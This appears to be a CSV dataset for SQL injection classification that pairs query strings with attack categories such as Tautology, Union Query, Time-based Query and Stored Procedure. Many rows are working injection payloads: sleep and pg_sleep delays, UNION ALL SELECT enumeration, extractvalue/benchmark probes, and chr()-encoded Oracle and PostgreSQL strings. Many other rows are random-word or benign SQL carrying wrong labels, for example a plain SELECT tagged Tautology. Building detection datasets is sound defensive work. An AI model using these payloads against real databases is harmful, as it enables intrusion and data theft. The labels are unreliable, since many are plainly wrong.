knownpatterns,category
SELECT COUNT ( partly ) FROM window,Illegal/Logically incorrect query
""" SELECT column_name ( s )  FROM blue,pressure""",Tautology
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,Tautology
SELECT * FROM attention FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM hay,Tautology
"""1"""" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )   and """"ikhr""""  =  """"ikhr""",Stored Procedure
"""1%'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '""",Tautology
SELECT AVG ( for ) FROM putting SELECT SUM ( season ) ,Illegal/Logically incorrect query
SELECT * FROM there WHERE NOT past = 'purpose'  AND NOT principal = 'secret',Tautology
"""-2704""""  )   union all select 1323323323323323323323323323--""",Union Query
1'+  (  select 'mdiu' where 4443  =  4443,Tautology
""" SELECT * FROM mouth ORDER BY wish, north""",Tautology
SELECT MIN ( purple )  AS collect FROM luck,Illegal/Logically incorrect query
end and 'blit'  =  'blit,Tautology
"""   SELECT may, shoot, loseFROM cell WHERE busy  IS NOT NULL""",Tautology
SELECT TOP 50 PERCENT * FROM enter SELECT * FROM soldier FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM property,Tautology
-3648' where 4629  =  4629 order by 1--,Tautology
"""   SELECT Employees.level, COUNT ( Orders.additionID )  AS circusFROM    ( OrdersINNER JOIN service ON Orders.southID  =  Employees.stairsID ) """,Illegal/Logically incorrect query
SELECT AVG ( outside ) FROM combine,Illegal/Logically incorrect query
SELECT * FROM island WHERE green = 'secret' LIMIT 3,Tautology
"""   SELECT transportation, older+ ', ' + traffic+ ' ' + surprise+ ', ' + simple AS quietly  FROM full""",Tautology
SELECT DISTINCT consonant FROM ago,Tautology
SELECT * FROM spin WHERE fence NOT LIKE '[master]%',Tautology
"""1'  )   as yjdg where 5262  =  5262 union all select null,null,null#""",Union Query
1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng,Tautology
SELECT * FROM north WHERE church = 'especially',Tautology
"""-8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049#""",Union Query
1   )    )    or sleep  (  5  )  #,Time-based Query
DELETE FROM label,Tautology
"""1""""  )   as kuuf where 6908  =  6908""",Tautology
""" SELECT * FROM recent ORDER BY swept, play""",Tautology
"""1""""  )   as wmng where 5976  =  5976""",Tautology
"""  SELECT call,fear FROM gate WHERE get = 'cutting' UNION SELECT terrible, keep FROM underline""",Union Query
"""- 1280"""" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#""",Union Query
SELECT * FROM figure WHERE ear = 'mean' LIMIT 3,Tautology
SELECT TOP 50 PERCENT * FROM realize,Tautology
"""-2448%""""  )   or 3038  =  3038""",Tautology
"""   SELECT being,older,distance,nobody,building     (  (  tin JOIN reach ON again.noise =  lost.appropriate )   INNER JOIN aliveON Orders.buried =  speech.grandfatherID ) """,Tautology
SELECT AVG ( mud )  FROM learn  SELECT SUM ( cannot ) ,Illegal/Logically incorrect query
"""1,  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   """,Illegal/Logically incorrect query
@var select @var as var into temp end --,Alternate Encoding
SELECT Count ( * )  AS clean,Illegal/Logically incorrect query
"""1"""" and sleep  (  5  )   and """"masm""""  =  """"masm""",Time-based Query
SELECT * FROM orbit WHERE card = 'children'  OR regular = 'path',Tautology
SELECT * FROM hope FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM recall,Tautology
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'svwr'  =  'svwr,Time-based Query
SELECT * FROM modern 3,Tautology
"""1' in boolean mode  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )    )  #""",Stored Procedure
SELECT * FROM clean FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
SELECT * FROM football 3,Tautology
"""1""""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   """"mzhk""""  =  """"mzhk""",Alternate Encoding
"""1"""" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and """"jbty"""" like """"jbty""",Tautology
"""   SELECT written, rays, using FROM apartment WHERE dozen  IS NULL""",Tautology
"""select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--""",Tautology
"""1""""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )   and    (    (     (  """"tabq"""" like """"tabq""",Stored Procedure
"""  SELECT children AS character, leg AS [coach]  FROM some""",Alternate Encoding
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,Time-based Query
1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,Alternate Encoding
-4351'  )   or 6525  =  9458,Tautology
"""1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '""",Time-based Query
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,Tautology
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",Union Query
select   (  case when   (  2350  =  8682  )   then 2350 else 1/  (  select 0  )   end  )  --,Tautology
1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,Time-based Query
SELECT * FROM late WHERE led = 'pound' FETCH FIRST 3 ROWS ONLY,Tautology
"""1%""""  )   order by 1--""",Tautology
"""1""""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270   )    )     )  x717a767a71x78   )    )   x   )    )   --""",Alternate Encoding
SELECT AVG ( its ) FROM write SELECT SUM ( nearly ) ,Illegal/Logically incorrect query
SELECT * FROM curve 3 SELECT * FROM water,Tautology
1  )   as ywrn where 1893=1893,Tautology
"""1'   )    )     )   and extractvalue  (  7982,concat  (  0x5cx7171706a71,  (  select   (  elt  (  7982  =  7982   )    )     )  x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi""",Alternate Encoding
SELECT * FROM army WHERE animal = 'cutting'  OR cover = 'effort',Tautology
SELECT TOP 3 * FROM second WHERE region = 'expect' SELECT * FROM hard,Tautology
- 1304'  )   union all select 7639#,Union Query
"""-8436'  )   as frmf where 7225  =  7225 or make_set  (  9354  =  9354,7185  )  --""",Tautology
1'  )   as nexa where 6740  =  6740,Tautology
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,Tautology
SELECT AVG ( gradually ) FROM load SELECT SUM ( average ) ,Illegal/Logically incorrect query
'&',Tautology
"""1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'cpfn' like 'cpfn""",Illegal/Logically incorrect query
AS INJECTX WHERE 1=1 AND 1=1#,Tautology
"""-3349   )    )     )   union all select 6553,6553#""",Union Query
-4032'  )   where 5157  =  5157 or 1809  =  2810#,Tautology
""" SELECT column_name ( s )  FROM due,musical""",Tautology
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'lzbn'  =  'lzbn,Time-based Query
SELECT * FROM  ( SELECT verb FROM occasionally ) ,Tautology
SELECT AVG ( equally ) FROM night,Illegal/Logically incorrect query
"""select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  """"eboa"""" like """"eboa""",Tautology
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM catch,Tautology
"""1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5cx7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   x717a767a71   )    )     )  --""",Stored Procedure
SELECT TOP 50 PERCENT * FROM report SELECT * FROM yesterday FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,Tautology
SELECT * FROM any  WHERE may = building,Tautology
SELECT AVG ( solution ) FROM spell SELECT SUM ( addition ) ,Illegal/Logically incorrect query
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_settings' LIMIT 1,Tautology
"""1""""   )    )    as tngu where 3644  =  3644 union all select null--""",Union Query
SELECT * FROM rule WHERE seeing BETWEEN '1996-07-01' AND '1996-07-31',Tautology
"""1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5cx7171706a71,  (  select   (  elt  (  1297=1297   )    )     )  x717a767a71   )    )   #""",Alternate Encoding
-7442  )   or 3391=  7492,Tautology
"""1""""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --""",Illegal/Logically incorrect query
or 2>1,Tautology
SELECT * INTO CustomersBackup2017 FROM Customers;,Alternate Encoding
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY,Tautology
""" SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country AS Address  FROM Customers;""",Illegal/Logically incorrect query
end and    (    (   'pfrt'  =  'pfrt,Tautology
"""1""""  )   waitfor delay '0:0:5' and   (  """"hhzy"""" like """"hhzy""",Time-based Query
ORDER BY 29--,Tautology
SELECT * FROM grandmother  WHERE fourth NOT LIKE '[previous]%',Tautology
SELECT * FROM cutting WHERE room  BETWEEN 10 AND 20,Tautology
SELECT TOP 3 * FROM attack WHERE doctor = 'coat' SELECT * FROM smaller,Tautology
""" select * from users where id=1 or """"@  )  """" or 1=1-- 1""""",Tautology
"""   SELECT soap, home, distance FROM may WHERE saved  IS NULL""",Tautology
"""1'  )   where 7093  =  7093 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,Tautology
select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  #,Alternate Encoding
"""  UPDATE vapor SET pile =  'return', City =  'land' WHERE solve =  longer""",Tautology
SELECT COUNT ( characteristic ) FROM shorter,Illegal/Logically incorrect query
SELECT * FROM mirror 3 SELECT * FROM pleasant,Tautology
"""1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270   )    )     )  x717a767a71x78   )    )   x   )    )    and    (    (     (  'toft'  =  'toft""",Alternate Encoding
SELECT * FROM baby WHERE smaller = 'treated' FETCH FIRST 3 ROWS ONLY,Tautology
"""1,  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   """,Tautology
SELECT * FROM story FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
SELECT nails ( s )  FROM sick LEFT JOIN,Tautology
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,Time-based Query
"""1"""" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and """"ouix""""  =  """"ouix""",Illegal/Logically incorrect query
"""1""""  )   where 2657  =  2657 and 5309  =  7592--""",Tautology
"""   SELECT COUNT ( them ) , solid FROM card BY author""",Illegal/Logically incorrect query
-6079   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  8708  =  8708,Tautology
SELECT * FROM buffalo,Tautology
""" SELECT * FROM continent ORDER BY donkey ASC, eaten DESC""",Tautology
"""1""""   )    )    as fhlg where 1004=1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --""",Tautology
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  # ewsz,Time-based Query
or sleep  (  __TIME__  )    =  ',Time-based Query
"""1   )    )    union all select null,null,null,null,null#""",Union Query
"""1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh""",Tautology
"""  SELECT * FROM cannot WHERE soft IN  ( 'toward', 'harbor', 'cloth' )  """,Tautology
SELECT TOP 3 * FROM announced WHERE cream = 'school',Tautology
"""  SELECT Orders.distancerID, Employees.said, Employees.sleep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.memoryID ORDER BY Orders.rememberID""",Time-based Query
1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,Union Query
"""-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--""",Union Query
-8463   )    )     )   or 4861=  9834#,Tautology
SELECT TOP 50 PERCENT * FROM basket SELECT * FROM record FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM youth,Tautology
"""   SELECT Employees.surrounded, COUNT ( Orders.exclaimedID )  AS rushFROM    ( OrdersINNER JOIN accurate ON Orders.herselfID  =  Employees.sitID ) """,Illegal/Logically incorrect query
"""  UPDATE cry SET feel =  'operation', City =  'stage' WHERE wrapped =  melted""",Tautology
select case when 1238  =  9044 then 1 else null end--,Tautology
"""1%'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #""",Time-based Query
SELECT AVG ( pattern ) FROM way SELECT SUM ( distant ) ,Illegal/Logically incorrect query
"""select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo""",Illegal/Logically incorrect query
"""1' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --""",Illegal/Logically incorrect query
"""  SELECT social,great,dress FROM body LEFT JOIN Orders ON so.betweenID =  clean.sheep ORDER BY won.are""",Tautology
select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,Tautology
"""1""""   )    )    as qode where 2398  =  2398 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )  --""",Stored Procedure
"""1"""" where 4991=  4991 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
"""1'   )    )     )   or extractvalue  (  1297,concat  (  0x5cx7171706a71,  (  select   (  elt  (  1297=1297   )    )     )  x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq""",Alternate Encoding
"""- 1000"""" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and """"isbq""""  =  """"isbq""",Tautology
"""1""""  )   where 3727  =  3727 and 4241=  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241=  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --""",Alternate Encoding
SELECT well ( s )  FROM nothing LEFT JOIN,Tautology
SELECT * FROM coal ORDER BY beside DESC,Tautology
